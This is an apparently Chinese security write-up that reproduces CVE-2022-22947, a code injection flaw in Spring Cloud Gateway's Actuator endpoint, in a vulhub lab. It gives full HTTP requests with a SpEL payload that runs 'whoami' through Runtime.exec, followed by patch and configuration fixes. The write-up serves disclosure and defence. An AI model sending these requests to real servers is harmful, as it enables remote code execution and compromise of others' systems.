## **漏洞描述**

Spring Cloud Gateway是基于Spring Framework和Spring
Boot构建的API网关，它旨在为微服务架构提供一种简单、有效、统一的API路由管理方式。

Spring官方博客发布了一篇关于Spring Cloud Gateway的CVE报告，据公告描述，当启用和暴露Gateway
Actuator端点时，使用Spring Cloud Gateway的应用程序可受到代码注入攻击。攻击者可以发送特制的恶意请求，从而远程执行任意代码。

##  **影响版本**

Spring Cloud Gateway 3.1.x < 3.1.1

Spring Cloud Gateway < 3.0.7

##  **漏洞环境搭建**

更新vulhub：

    
    
    git pull

![](https://image.3001.net/images/20220330/1648628228_6244120452722fd1cb737.png!small)  

切换到/vulhub/spring/CVE-2022-22947目录，拉取漏洞环境：

    
    
    docker-compose up -d

![](https://image.3001.net/images/20220330/1648628276_624412340a55fe374fa87.png!small)查看本机ip：  

    
    
    ifconfig

![](https://image.3001.net/images/20220330/1648628313_6244125991f42fc7545b7.png!small)

访问http://192.168.8.162:8080

![](https://image.3001.net/images/20220330/1648628340_62441274bc7e09084cdd3.png!small)  

##  **漏洞复现**

添加包含恶意的路由：

    
    
    POST /actuator/gateway/routes/EchoSec HTTP/1.1
    Host: 192.168.8.162:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Connection: close
    Content-Type: application/json
    Content-Length: 334
     
    {
      "id": "EchoSec",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {
          "name": "Result",
          "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
        }
      }],
      "uri": "http://example.com"
    }

![](https://image.3001.net/images/20220330/1648628461_624412ed1a06313757f74.png!small)

刷新网关路由：

    
    
    POST /actuator/gateway/refresh HTTP/1.1
    Host: 192.168.8.162:8080
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 334
    
    {
      "id": "EchoSec",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {
          "name": "Result",
          "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
        }
      }],
      "uri": "http://example.com"
    }

![](https://image.3001.net/images/20220330/1648629274_6244161a49a9e4051c656.png!small)  

命令执行成功：  

    
    
    GET /actuator/gateway/routes/EchoSec HTTP/1.1
    Host: 192.168.8.162:8080
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 336
     
    {
      "id": "EchoSec",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {
          "name": "Result",
          "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
        }
      }],
      "uri": "http://example.com"
    }

![](https://image.3001.net/images/20220330/1648629037_6244152d01c695f781076.png!small)

删除添加的恶意路由：

    
    
    DELETE /actuator/gateway/routes/EchoSec HTTP/1.1
    Host: 192.168.8.162:8080
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 338
    
    {
      "id": "EchoSec",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {
          "name": "Result",
          "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
        }
      }],
      "uri": "http://example.com"
    }

![](https://image.3001.net/images/20220330/1648629366_62441676b31473a7882a9.png!small)

##  **修复建议**

1.更新升级 Spring Cloud Gateway 到以下安全版本：

Spring Cloud Gateway 3.1.1

Spring Cloud Gateway 3.0.7

2.或在不考虑影响业务的情况下禁用 Actuator 接口:

通过management.endpoint.gateway.enable：false配置将其禁用。

##  **参考链接**

https://tanzu.vmware.com/security/cve-2022-22947

  

  

